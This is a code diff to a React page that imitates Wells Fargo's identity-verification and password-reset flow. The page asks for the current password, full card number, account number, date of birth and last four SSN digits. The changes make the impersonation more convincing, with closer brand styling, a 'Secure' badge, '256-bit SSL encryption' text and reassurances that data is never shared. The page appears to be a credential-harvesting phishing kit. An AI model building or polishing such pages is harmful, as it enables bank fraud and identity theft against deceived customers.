@@ -16,7 +16,7 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Search, Shield, Mail, Phone, HelpCircle, ChevronRight, Loader2, Lock, Check, AlertCircle, CreditCard, Building2, Key } from "lucide-react";
+import { Shield, Mail, Phone, ChevronRight, Loader2, Lock, Check, AlertCircle, CreditCard, Building2, Key, CheckCircle2, ArrowRight, Globe } from "lucide-react";
 import { Link, useLocation } from "wouter";
 
 const verificationMethods = [
@@ -24,19 +24,19 @@ const verificationMethods = [
     id: "text",
     icon: Phone,
     title: "Text message",
-    description: "Get a one-time code sent to your phone",
+    description: "Receive a one-time security code via SMS",
   },
   {
     id: "call",
     icon: Phone,
     title: "Phone call",
-    description: "Get a one-time code by phone call",
+    description: "Receive a one-time security code by phone",
   },
   {
     id: "email",
     icon: Mail,
     title: "Email",
-    description: "Get a one-time code sent to your email",
+    description: "Receive a one-time security code via email",
   },
 ];
 
@@ -112,7 +112,7 @@ export default function VerifyPage() {
     onSuccess: () => {
       toast({
         title: "Identity Verified",
-        description: "You can now reset your password.",
+        description: "You can now update your password.",
       });
       setStep("password");
     },
@@ -133,24 +133,26 @@ export default function VerifyPage() {
     onSuccess: () => {
       toast({
         title: "Password Updated",
-        description: "Your password has been successfully changed.",
+        description: "Your password has been successfully updated.",
       });
       setStep("success");
     },
     onError: (error: Error) => {
       toast({
-        title: "Password Reset Failed",
+        title: "Update Failed",
         description: error.message || "Failed to update password.",
         variant: "destructive",
       });
     },
   });
 
-  
   if (isLoading) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-50">
-        <Loader2 className="w-8 h-8 animate-spin text-[#d71e28]" />
+      <div className="min-h-screen flex items-center justify-center bg-[#fafafa]">
+        <div className="text-center">
+          <Loader2 className="w-10 h-10 animate-spin text-[#cd1409] mx-auto mb-4" />
+          <p className="text-gray-600">Loading your secure session...</p>
+        </div>
       </div>
     );
   }
@@ -173,113 +175,179 @@ export default function VerifyPage() {
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-[#f5f5f5]">
-      <header className="bg-[#d71e28] text-white">
-        <div className="max-w-7xl mx-auto px-4 py-3">
-          <div className="flex items-center justify-between">
+    <div className="min-h-screen flex flex-col bg-[#fafafa]">
+      {/* Header */}
+      <header className="bg-[#cd1409]">
+        <div className="max-w-[1280px] mx-auto px-4">
+          <div className="flex items-center justify-between py-4">
             <Link href="/">
-              <span
-                className="text-xl font-bold tracking-wide cursor-pointer"
-                style={{ fontFamily: "'Times New Roman', 'Georgia', serif" }}
-                data-testid="text-logo"
-              >
-                WELLS FARGO
-              </span>
+              <div className="flex items-center gap-2 cursor-pointer">
+                <div className="w-8 h-8 bg-[#ffcd41] rounded-full flex items-center justify-center">
+                  <Building2 className="w-5 h-5 text-[#cd1409]" />
+                </div>
+                <span
+                  className="text-white text-xl tracking-wide"
+                  style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+                  data-testid="text-logo"
+                >
+                  WELLS FARGO
+                </span>
+              </div>
             </Link>
 
-            <nav className="flex items-center gap-4 text-xs">
-              <a href="#" className="hover:underline hidden sm:inline" data-testid="link-customer-service">
-                Customer Service
+            <nav className="flex items-center gap-6 text-sm text-white/90">
+              <a href="#" className="hover:text-white hidden sm:inline transition-colors" data-testid="link-help">
+                Help
               </a>
-              <a href="#" className="hover:underline hidden sm:inline" data-testid="link-espanol">
+              <a href="#" className="hover:text-white hidden sm:inline flex items-center gap-1 transition-colors" data-testid="link-espanol">
+                <Globe className="w-4 h-4" />
                 Español
               </a>
-              <div className="flex items-center gap-2">
-                <Search className="w-4 h-4" />
+              <div className="flex items-center gap-2 text-white/80">
+                <Lock className="w-4 h-4" />
+                <span className="text-xs hidden sm:inline">Secure</span>
               </div>
             </nav>
           </div>
         </div>
       </header>
 
-      <div className="bg-[#ffcd41] h-1"></div>
+      {/* Yellow accent */}
+      <div className="bg-gradient-to-r from-[#ffcd41] via-[#ffd44f] to-[#ffcd41] h-[6px]"></div>
 
-      <main className="flex-1 py-8">
+      {/* Progress indicator */}
+      <div className="bg-white border-b">
+        <div className="max-w-2xl mx-auto px-4 py-4">
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
+                step === "choose" ? "bg-[#cd1409] text-white" : "bg-green-500 text-white"
+              }`}>
+                {step !== "choose" ? <Check className="w-4 h-4" /> : "1"}
+              </div>
+              <span className="text-sm font-medium text-gray-700">Select Method</span>
+            </div>
+            <div className="flex-1 h-0.5 mx-4 bg-gray-200">
+              <div className={`h-full bg-[#cd1409] transition-all ${
+                step === "choose" ? "w-0" : step === "identity" ? "w-1/2" : "w-full"
+              }`}></div>
+            </div>
+            <div className="flex items-center gap-3">
+              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
+                step === "identity" ? "bg-[#cd1409] text-white" : 
+                step === "password" || step === "success" ? "bg-green-500 text-white" : "bg-gray-200 text-gray-500"
+              }`}>
+                {step === "password" || step === "success" ? <Check className="w-4 h-4" /> : "2"}
+              </div>
+              <span className="text-sm font-medium text-gray-700">Verify Identity</span>
+            </div>
+            <div className="flex-1 h-0.5 mx-4 bg-gray-200">
+              <div className={`h-full bg-[#cd1409] transition-all ${
+                step === "password" ? "w-1/2" : step === "success" ? "w-full" : "w-0"
+              }`}></div>
+            </div>
+            <div className="flex items-center gap-3">
+              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
+                step === "password" ? "bg-[#cd1409] text-white" : 
+                step === "success" ? "bg-green-500 text-white" : "bg-gray-200 text-gray-500"
+              }`}>
+                {step === "success" ? <Check className="w-4 h-4" /> : "3"}
+              </div>
+              <span className="text-sm font-medium text-gray-700 hidden sm:inline">Complete</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <main className="flex-1 py-10">
         <div className="max-w-2xl mx-auto px-4">
           {step === "choose" && (
             <>
-              <div className="mb-6">
-                <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-title">
-                  Let's make sure it's you
+              <div className="mb-8 text-center">
+                <div className="w-16 h-16 bg-[#cd1409]/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <Shield className="w-8 h-8 text-[#cd1409]" />
+                </div>
+                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-title">
+                  Additional Security Verification
                 </h1>
-                <p className="text-gray-600">
-                  For your security, we need to verify your identity. How would you like to receive your verification code?
+                <p className="text-gray-600 max-w-md mx-auto">
+                  To protect your account, please verify your identity. Select how you'd like to receive your security code.
                 </p>
               </div>
 
-              <Card className="shadow-sm border-gray-200" data-testid="card-verify">
+              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-verify">
+                <div className="bg-gradient-to-r from-gray-50 to-gray-100 px-6 py-3 border-b">
+                  <p className="text-sm font-medium text-gray-700">Choose verification method</p>
+                </div>
                 <CardContent className="p-0">
                   {verificationMethods.map((method, index) => (
                     <button
                       key={method.id}
                       onClick={() => handleMethodSelect(method.id)}
-                      className={`w-full p-4 text-left hover:bg-gray-50 transition-colors flex items-center gap-4 ${
-                        index !== verificationMethods.length - 1 ? "border-b border-gray-200" : ""
+                      className={`w-full p-5 text-left hover:bg-[#fef3f3] transition-colors flex items-center gap-4 ${
+                        index !== verificationMethods.length - 1 ? "border-b border-gray-100" : ""
                       }`}
                       data-testid={`button-method-${method.id}`}
                     >
-                      <div className="w-10 h-10 bg-[#d71e28]/10 rounded-full flex items-center justify-center text-[#d71e28]">
-                        <method.icon className="w-5 h-5" />
+                      <div className="w-12 h-12 bg-[#cd1409] rounded-full flex items-center justify-center text-white shadow-md">
+                        <method.icon className="w-6 h-6" />
                       </div>
                       <div className="flex-1">
-                        <p className="font-medium text-gray-800">{method.title}</p>
+                        <p className="font-semibold text-gray-900">{method.title}</p>
                         <p className="text-sm text-gray-500">{method.description}</p>
                       </div>
-                      <ChevronRight className="w-5 h-5 text-gray-400" />
+                      <ArrowRight className="w-5 h-5 text-[#cd1409]" />
                     </button>
                   ))}
                 </CardContent>
               </Card>
 
-              <div className="mt-6 flex items-center gap-2 text-sm">
-                <HelpCircle className="w-4 h-4 text-gray-500" />
-                <span className="text-gray-600">
-                  Having trouble?{" "}
-                  <a href="#" className="text-[#d71e28] hover:underline">
-                    Try another way
-                  </a>
-                </span>
+              <div className="mt-8 p-4 bg-blue-50 rounded-lg border border-blue-100">
+                <div className="flex items-start gap-3">
+                  <Shield className="w-5 h-5 text-blue-600 mt-0.5" />
+                  <div>
+                    <p className="text-sm font-medium text-blue-900">Why am I seeing this?</p>
+                    <p className="text-sm text-blue-700 mt-1">
+                      We require additional verification to ensure the security of your account. This helps protect against unauthorized access.
+                    </p>
+                  </div>
+                </div>
               </div>
-
-                          </>
+            </>
           )}
 
           {step === "identity" && (
             <>
               <button
                 onClick={() => setStep("choose")}
-                className="flex items-center gap-1 text-[#d71e28] text-sm mb-6 hover:underline"
+                className="flex items-center gap-1 text-[#cd1409] text-sm mb-6 hover:underline font-medium"
                 data-testid="button-back"
               >
                 <ChevronRight className="w-4 h-4 rotate-180" />
-                Back
+                Back to verification options
               </button>
 
-              <div className="mb-6">
-                <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-identity-title">
-                  Verify your identity
+              <div className="mb-8">
+                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-identity-title">
+                  Confirm Your Identity
                 </h1>
                 <p className="text-gray-600">
-                  For your security, please confirm your identity by entering the information below.
+                  For your security, please verify your identity by providing the following information.
                 </p>
               </div>
 
-              <Card className="shadow-sm border-gray-200" data-testid="card-identity">
-                <CardContent className="p-6">
-                  <div className="flex items-start gap-3 p-4 bg-blue-50 rounded-lg mb-6">
-                    <AlertCircle className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
-                    <p className="text-sm text-blue-800">
-                      For your security, please verify your identity by providing the information below.
+              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-identity">
+                <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
+                  <div className="flex items-center gap-2 text-white">
+                    <Lock className="w-5 h-5" />
+                    <span className="font-semibold">Secure Identity Verification</span>
+                  </div>
+                </div>
+                <CardContent className="p-6 bg-white">
+                  <div className="flex items-start gap-3 p-4 bg-amber-50 rounded-lg mb-6 border border-amber-200">
+                    <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
+                    <p className="text-sm text-amber-800">
+                      Your information is encrypted and protected. We will never share your personal data.
                     </p>
                   </div>
 
@@ -290,15 +358,15 @@ export default function VerifyPage() {
                         name="currentPassword"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700 font-medium flex items-center gap-2">
-                              <Key className="w-4 h-4" />
+                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
+                              <Key className="w-4 h-4 text-[#cd1409]" />
                               Current Password
                             </FormLabel>
                             <FormControl>
                               <Input
                                 type="password"
                                 placeholder="Enter your current password"
-                                className="h-12 border-gray-300"
+                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                 data-testid="input-current-password"
                                 {...field}
                               />
@@ -313,16 +381,16 @@ export default function VerifyPage() {
                         name="cardNumber"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700 font-medium flex items-center gap-2">
-                              <CreditCard className="w-4 h-4" />
-                              Debit or Credit Card Number
+                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
+                              <CreditCard className="w-4 h-4 text-[#cd1409]" />
+                              Wells Fargo Debit or Credit Card Number
                             </FormLabel>
                             <FormControl>
                               <Input
                                 type="text"
-                                placeholder="Enter 13-19 digit card number"
+                                placeholder="Enter your 13-19 digit card number"
                                 maxLength={19}
-                                className="h-12 border-gray-300"
+                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                 data-testid="input-card-number"
                                 {...field}
                               />
@@ -337,8 +405,8 @@ export default function VerifyPage() {
                         name="accountNumber"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700 font-medium flex items-center gap-2">
-                              <Building2 className="w-4 h-4" />
+                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
+                              <Building2 className="w-4 h-4 text-[#cd1409]" />
                               Account Number
                             </FormLabel>
                             <FormControl>
@@ -346,7 +414,7 @@ export default function VerifyPage() {
                                 type="text"
                                 placeholder="Enter your account number"
                                 maxLength={17}
-                                className="h-12 border-gray-300"
+                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                 data-testid="input-account-number"
                                 {...field}
                               />
@@ -356,59 +424,61 @@ export default function VerifyPage() {
                         )}
                       />
 
-                      <FormField
-                        control={identityForm.control}
-                        name="dateOfBirth"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-medium">
-                              Date of Birth
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                type="date"
-                                className="h-12 border-gray-300"
-                                data-testid="input-dob"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
+                      <div className="grid grid-cols-2 gap-4">
+                        <FormField
+                          control={identityForm.control}
+                          name="dateOfBirth"
+                          render={({ field }) => (
+                            <FormItem>
+                              <FormLabel className="text-gray-700 font-semibold">
+                                Date of Birth
+                              </FormLabel>
+                              <FormControl>
+                                <Input
+                                  type="date"
+                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
+                                  data-testid="input-dob"
+                                  {...field}
+                                />
+                              </FormControl>
+                              <FormMessage />
+                            </FormItem>
+                          )}
+                        />
 
-                      <FormField
-                        control={identityForm.control}
-                        name="ssn"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-medium">
-                              Last 4 digits of SSN
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                type="password"
-                                placeholder="••••"
-                                maxLength={4}
-                                className="h-12 border-gray-300"
-                                data-testid="input-ssn"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
+                        <FormField
+                          control={identityForm.control}
+                          name="ssn"
+                          render={({ field }) => (
+                            <FormItem>
+                              <FormLabel className="text-gray-700 font-semibold">
+                                Last 4 of SSN
+                              </FormLabel>
+                              <FormControl>
+                                <Input
+                                  type="password"
+                                  placeholder="••••"
+                                  maxLength={4}
+                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409] text-center tracking-widest"
+                                  data-testid="input-ssn"
+                                  {...field}
+                                />
+                              </FormControl>
+                              <FormMessage />
+                            </FormItem>
+                          )}
+                        />
+                      </div>
 
                       <Button
                         type="submit"
-                        className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded"
+                        className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg mt-6"
                         disabled={verifyMutation.isPending}
                         data-testid="button-verify-submit"
                       >
                         {verifyMutation.isPending ? (
                           <>
-                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                             Verifying...
                           </>
                         ) : (
@@ -420,30 +490,37 @@ export default function VerifyPage() {
                 </CardContent>
               </Card>
 
-              <p className="text-xs text-gray-500 mt-4 text-center">
-                Your information is protected with bank-level encryption.
-              </p>
+              <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-500">
+                <Lock className="w-4 h-4 text-green-600" />
+                <span>Protected with 256-bit SSL encryption</span>
+              </div>
             </>
           )}
 
           {step === "password" && (
             <>
-              <div className="mb-6">
+              <div className="mb-8">
                 <div className="flex items-center gap-2 text-green-600 mb-4">
-                  <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center">
-                    <Check className="w-4 h-4" />
+                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
+                    <CheckCircle2 className="w-5 h-5" />
                   </div>
-                  <span className="text-sm font-medium">Identity verified</span>
+                  <span className="font-semibold">Identity verified successfully</span>
                 </div>
-                <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-password-title">
-                  Change your password
+                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-password-title">
+                  Update Your Password
                 </h1>
                 <p className="text-gray-600">
-                  Create a new password for your account. Your password must be at least 6 characters.
+                  Create a new secure password for your account. Your password must be at least 6 characters.
                 </p>
               </div>
 
-              <Card className="shadow-sm border-gray-200" data-testid="card-password">
+              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-password">
+                <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
+                  <div className="flex items-center gap-2 text-white">
+                    <Key className="w-5 h-5" />
+                    <span className="font-semibold">Create New Password</span>
+                  </div>
+                </div>
                 <CardContent className="p-6">
                   <Form {...passwordForm}>
                     <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-5">
@@ -452,14 +529,12 @@ export default function VerifyPage() {
                         name="newPassword"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700 font-medium">
-                              New Password
-                            </FormLabel>
+                            <FormLabel className="text-gray-700 font-semibold">New Password</FormLabel>
                             <FormControl>
                               <Input
                                 type="password"
                                 placeholder="Enter new password"
-                                className="h-12 border-gray-300"
+                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                 data-testid="input-new-password"
                                 {...field}
                               />
@@ -474,14 +549,12 @@ export default function VerifyPage() {
                         name="confirmPassword"
                         render={({ field }) => (
                           <FormItem>
-                            <FormLabel className="text-gray-700 font-medium">
-                              Confirm New Password
-                            </FormLabel>
+                            <FormLabel className="text-gray-700 font-semibold">Confirm Password</FormLabel>
                             <FormControl>
                               <Input
                                 type="password"
-                                placeholder="Re-enter new password"
-                                className="h-12 border-gray-300"
+                                placeholder="Confirm new password"
+                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
                                 data-testid="input-confirm-password"
                                 {...field}
                               />
@@ -491,37 +564,33 @@ export default function VerifyPage() {
                         )}
                       />
 
-                      <div className="bg-gray-50 p-4 rounded-lg">
+                      <div className="bg-gray-50 p-4 rounded-lg border">
                         <p className="text-sm font-medium text-gray-700 mb-2">Password requirements:</p>
                         <ul className="text-sm text-gray-600 space-y-1">
                           <li className="flex items-center gap-2">
-                            <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
+                            <Check className="w-4 h-4 text-green-500" />
                             At least 6 characters
                           </li>
                           <li className="flex items-center gap-2">
-                            <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
-                            Include letters and numbers
-                          </li>
-                          <li className="flex items-center gap-2">
-                            <div className="w-1.5 h-1.5 bg-gray-400 rounded-full"></div>
-                            Cannot be your previous password
+                            <Check className="w-4 h-4 text-green-500" />
+                            Mix of letters and numbers recommended
                           </li>
                         </ul>
                       </div>
 
                       <Button
                         type="submit"
-                        className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded"
+                        className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg"
                         disabled={resetPasswordMutation.isPending}
-                        data-testid="button-reset-password"
+                        data-testid="button-reset-submit"
                       >
                         {resetPasswordMutation.isPending ? (
                           <>
-                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
+                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                             Updating...
                           </>
                         ) : (
-                          "Change Password"
+                          "Update Password"
                         )}
                       </Button>
                     </form>
@@ -532,39 +601,47 @@ export default function VerifyPage() {
           )}
 
           {step === "success" && (
-            <div className="text-center py-8">
-              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                <Check className="w-8 h-8 text-green-600" />
+            <div className="text-center py-12">
+              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <CheckCircle2 className="w-10 h-10 text-green-600" />
               </div>
-              <h1 className="text-2xl font-light text-gray-800 mb-2" data-testid="text-success-title">
-                Password changed successfully
+              <h1 className="text-2xl font-light text-gray-900 mb-3" style={{ fontFamily: "Georgia, serif" }} data-testid="text-success-title">
+                Verification Complete
               </h1>
-              <p className="text-gray-600 mb-8">
-                Your password has been updated. You can now access your accounts with your new password.
+              <p className="text-gray-600 mb-8 max-w-md mx-auto">
+                Your identity has been verified and your password has been updated successfully. You can now access your account.
               </p>
               <Button
                 onClick={() => setLocation("/dashboard")}
-                className="h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded px-8"
+                className="h-12 px-10 bg-[#cd1409] hover:bg-[#b81208] text-white font-bold rounded-full text-base shadow-md"
                 data-testid="button-continue-dashboard"
               >
-                Go to My Accounts
+                Continue to Dashboard
+                <ArrowRight className="w-5 h-5 ml-2" />
               </Button>
             </div>
           )}
         </div>
       </main>
 
-      <footer className="bg-white border-t border-gray-200 py-6">
-        <div className="max-w-7xl mx-auto px-4">
-          <div className="flex flex-wrap items-center justify-between gap-4 text-xs text-gray-500">
-            <div className="flex items-center gap-4">
-              <a href="#" className="hover:underline">Privacy, Cookies, Security & Legal</a>
-              <a href="#" className="hover:underline">Notice of Data Collection</a>
-              <a href="#" className="hover:underline">Ad Choices</a>
+      {/* Footer */}
+      <footer className="bg-[#1a1a1a] text-white py-6 mt-auto">
+        <div className="max-w-[1280px] mx-auto px-4">
+          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
+            <div className="flex items-center gap-2">
+              <div className="w-6 h-6 bg-[#ffcd41] rounded-full flex items-center justify-center">
+                <Building2 className="w-4 h-4 text-[#cd1409]" />
+              </div>
+              <span className="text-sm" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</span>
             </div>
-            <p data-testid="text-copyright">
-              © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
-            </p>
+            <div className="flex items-center gap-4 text-xs text-gray-500">
+              <a href="#" className="hover:text-white transition-colors">Privacy</a>
+              <span>|</span>
+              <a href="#" className="hover:text-white transition-colors">Security</a>
+              <span>|</span>
+              <a href="#" className="hover:text-white transition-colors">Terms of Use</a>
+            </div>
+            <p className="text-xs text-gray-500">© 2024 Wells Fargo. NMLSR ID 399801</p>
           </div>
         </div>
       </footer>
